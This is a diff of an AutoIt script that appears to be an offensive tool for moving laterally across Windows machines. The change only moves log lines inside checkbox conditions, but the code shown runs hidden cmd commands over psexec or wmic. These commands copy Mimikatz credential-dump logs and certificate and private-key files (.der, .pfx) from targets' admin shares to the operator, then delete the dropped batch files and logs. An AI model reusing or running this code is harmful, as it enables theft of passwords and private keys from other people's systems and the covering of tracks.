@@ -231,11 +231,13 @@ logprint("Executed lazy.bat on target" & @CRLF)
 
 
 if $method = "psexec" Then
-	logprint("Copying mimikatz.log from target" & @CRLF)
+
 	if _IsChecked($check1) Then
+		logprint("Copying mimikatz.log from target" & @CRLF)
 		RunWait(@ComSpec & " /C " & "copy /Y \\"&$ip&"\c$\windows\temp\mimikatz.log "&$dir&"\mimikatz_"&$ip&".log" ,"",@SW_HIDE,0x10000)
 	EndIf
 	if _IsChecked($check2) Then
+		logprint("Copying certificates from target" & @CRLF)
 		RunWait(@ComSpec & " /C " & "mkdir "&$dir&"\certs_"&$ip,"",@SW_HIDE,0x10000)
 		RunWait(@ComSpec & " /C " & "copy /Y \\"&$ip&"\c$\windows\temp\*.der "&$dir&"\certs_"&$ip&"\" ,"",@SW_HIDE,0x10000)
 		RunWait(@ComSpec & " /C " & "copy /Y \\"&$ip&"\c$\windows\temp\*.pfx "&$dir&"\certs_"&$ip&"\" ,"",@SW_HIDE,0x10000)
@@ -260,12 +262,14 @@ if $method = "wmic" Then
 	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\test$\lazy.bat","",@SW_HIDE,0x10000)
 	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\test$\test.bat","",@SW_HIDE,0x10000)
 	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\test$\framework.txt","",@SW_HIDE,0x10000)
-	logprint("Copying mimikatz.log from target" & @CRLF)
+
 	if _IsChecked($check1) Then
+		logprint("Copying mimikatz.log from target" & @CRLF)
 		RunWait(@ComSpec & " /C " & "copy /Y \\"&$ip&"\test$\mimikatz.log "&$dir&"\mimikatz_"&$ip&".log" ,"",@SW_HIDE,0x10000)
 		RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\test$\mimikatz.log","",@SW_HIDE,0x10000)
 	EndIf
 	if _IsChecked($check2) Then
+		logprint("Copying certificates from target" & @CRLF)
 		RunWait(@ComSpec & " /C " & "mkdir "&$dir&"\certs_"&$ip,"",@SW_HIDE,0x10000)
 		RunWait(@ComSpec & " /C " & "copy /Y \\"&$ip&"\test$\*.der "&$dir&"\certs_"&$ip&"\" ,"",@SW_HIDE,0x10000)
 		RunWait(@ComSpec & " /C " & "copy /Y \\"&$ip&"\test$\*.pfx "&$dir&"\certs_"&$ip&"\" ,"",@SW_HIDE,0x10000)
